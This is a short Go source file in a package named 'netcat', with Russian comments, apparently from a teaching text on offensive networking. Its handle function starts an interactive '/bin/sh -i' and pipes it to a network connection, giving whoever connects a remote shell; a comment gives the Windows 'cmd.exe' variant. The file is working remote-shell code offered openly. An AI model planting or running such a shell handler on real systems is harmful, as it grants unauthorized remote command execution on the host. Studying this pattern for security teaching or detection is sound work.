package netcat

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)
// Flusher wraps bufio.Writer,
type Flusher struct {
	w *bufio.Writer
}

// NewFlusher creates a new Flusher from an io.Writer
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher {
		w: bufio.NewWriter(w),
	}
}

// Write writes bytes and explicitly flushes buffer
func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

func handle(conn net.Conn) {
	// Явно вызываем /bin/sh с ключом -i для интерактивного режима и можем использовать это для ввода/вывода.
	// Для Windows использовать exec.Command("cmd.exe").
	cmd := exec.Command("/bin/sh", "-i")

	// Устанавливаем поток ввода
	cmd.Stdin = conn

	// Создаем экземпляр Flusher из соединения, чтобы была возможность использовать stdout.
	// Это гарантирует, что стандартный вывод очистится и отправится через net.Conn
	cmd.Stdout = NewFlusher(conn)

	// Запускаем команду
	if err := cmd.Run(); err != nil {
		log.Fatalln()
	}
}